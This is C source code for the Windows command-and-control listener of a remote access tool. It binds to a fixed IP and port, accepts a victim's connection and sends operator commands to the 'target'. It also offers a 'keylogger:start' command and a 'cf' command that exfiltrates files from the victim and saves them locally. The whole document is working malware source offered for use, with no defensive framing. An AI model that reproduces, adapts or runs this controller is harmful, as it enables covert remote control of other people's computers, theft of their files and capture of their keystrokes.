#include "status.h"
#include "str_cut.h"

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>

#define bzero(p, size) (void)memset((p), 0, (size))

int main()
{
  // Define variables
  int sock, client_socket;
  char buffer[1024];
  char response[18384];
  struct sockaddr_in server_address, client_address;
  int i = 0;
  int optval = 1;
  int client_length;

  // Check if WinSock is ready
  WSADATA wsaData;
  if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)
  {
    error("Couldn't initiate WinSock.");
    exit(1);
  }

  // Initialize Socket
  sock = socket(AF_INET, SOCK_STREAM, 0);

  if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (const char *)&optval, sizeof(optval)) < 0)
  {
    error("Error setting TCP Socket Options");
    return 1;
  }

  // Set Socket config
  server_address.sin_family = AF_INET;
  server_address.sin_addr.s_addr = inet_addr("192.168.1.21");
  server_address.sin_port = htons(6709);

  // Bind Server IP & Port
  bind(sock, (struct sockaddr *)&server_address, sizeof(server_address));

  info("[*] Listening for incoming connections...");

  // Listen for incoming connections
  listen(sock, 5);
  client_length = sizeof(client_address);

  // Accept connection request
  client_socket = accept(sock, (struct sockaddr *)&client_address, &client_length);

  while (1)
  {
    // Clean variables
    bzero(buffer, sizeof(buffer));
    bzero(response, sizeof(response));

    // Build Input
    char strInput[1024];
    sprintf(strInput, "\n\033[1;31mBlxd\033[0m\033[1;32mMoon\033[0m#%s~$: ", inet_ntoa(client_address.sin_addr));

    // Print Shell Input
    printf("%s", strInput);

    // Store input to buffer
    fgets(buffer, sizeof(buffer), stdin);

    // Clean the command
    strtok(buffer, "\n");

    // Send command to target
    send(client_socket, buffer, sizeof(buffer), 0);

    // Quit if input is "q"
    if (strncmp("q", buffer, 1) == 0)
    {
      info("Quitting Shell.");
      WSACleanup();
      break;
    }
    else if (strncmp("keylogger:start", buffer, 15) == 0)
    {
      info("Starting keylogger...");
      continue;
    }
    if (strncmp("cf ", buffer, 3) == 0)
    {
      warning("NOTE: Please be aware of some formatting issues.");
      info("Receiving file...");
      recv(client_socket, response, sizeof(response), 0);

      // Split response by ":"
      // sprintf(rspns, "file:%d:%s:%s", filesize, filename, file_contents);
      char *parts[4];
      int i = 0;
      char *token = strtok(response, ":");
      while (token != NULL)
      {
        parts[i++] = token;
        token = strtok(NULL, ":");
      }

      // Get file size
      int filesize = atoi(parts[1]);

      // Get file name
      char *filename = parts[2];

      // Get file contents
      char *file_contents = parts[3];

      info("\nFile information:");
      printf("\tFile size: %d\n", filesize);
      printf("\tFile name: %s\n", filename);

      // Create file
      FILE *file = fopen(filename, "wb");

      // Write file contents
      fwrite(file_contents, sizeof(char), filesize, file);

      success("Saved file successfully.\n");

      // Close file
      fclose(file);
    }
    else
    {
      recv(client_socket, response, sizeof(response), 0); // No need for MSG_WAITALL on Windows
      success(response);
    }
  }

  return 0;
}

/*
 */